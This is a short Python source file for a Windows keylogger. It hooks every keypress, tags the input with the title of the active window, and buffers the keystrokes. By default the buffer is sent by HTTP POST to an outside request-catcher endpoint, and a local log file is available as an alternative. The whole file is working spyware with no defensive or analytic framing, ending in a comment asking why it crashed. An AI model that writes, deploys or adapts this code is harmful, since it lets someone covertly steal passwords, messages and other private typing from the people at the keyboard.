#

import keyboard
import time
from ctypes import windll, create_unicode_buffer
import atexit
import requests

OUTPUT_FILE = 'logger.txt'
ENDPOINT = 'https://keys.requestcatcher.com/test'


def get_time():
    return time.strftime('%R:%S')


class Handler:
    cache = ''
    max_cache = 100

    def __init__(self):
        atexit.register(self.__del__)

    def __del__(self):
        self.write(flush=True)

    def write(self, something='', flush=False):
        """
        Implement this function with a handler handle new input

        :param something:
        :param flush: cache or actually do something with it?
        :return:
        """
        raise NotImplementedError('Please define this abstract function')


class FileHandler(Handler):
    def __init__(self):
        super().__init__()
        self.file_handler = open(OUTPUT_FILE, 'a', encoding="utf-8")

    def write(self, something='', flush=False):
        self.cache += something
        if flush or len(self.cache) > self.max_cache:
            print(self.cache, file=self.file_handler, end='')
            self.cache = ''
            self.file_handler.flush()

    def __del__(self):
        super().__del__()
        self.file_handler.close()


class WebHandler(Handler):
    def write(self, something='', flush=False):
        self.cache += something
        if flush or len(self.cache) > self.max_cache:
            requests.post(ENDPOINT, data={'text': self.cache})
            self.cache = ''

    def __del__(self):
        self.write(flush=True)


class Tracker:
    current_window = None

    def __init__(self):
        self.output_handler = WebHandler()
        keyboard.hook(self.callback)
        keyboard.wait()

    @staticmethod
    def get_foreground_window_title():
        h_wnd = windll.user32.GetForegroundWindow()
        length = windll.user32.GetWindowTextLengthW(h_wnd)
        buf = create_unicode_buffer(length + 1)
        windll.user32.GetWindowTextW(h_wnd, buf, length + 1)

        return buf.value

    def set_foreground_window_title(self):
        new = self.get_foreground_window_title()
        if self.current_window != new:
            self.output_handler.write(f"\n\n=== {get_time()}: {new} ===", True)
            self.current_window = new

    def callback(self, event):
        if event.event_type == 'down':
            self.set_foreground_window_title()
            inp = event.name

            if inp == 'space':
                inp = ' '
            elif inp == 'enter':
                inp = '\n'
            elif len(inp) > 1:
                # not just a character, but something special like ctrl
                inp = f'\\{inp}\\'

            # flush on newline
            self.output_handler.write(inp, inp == '\n')


def main():
    tracker = Tracker()


if __name__ == '__main__':
    main()

"""
Why tf dit it crash? I do not understand :C
"""
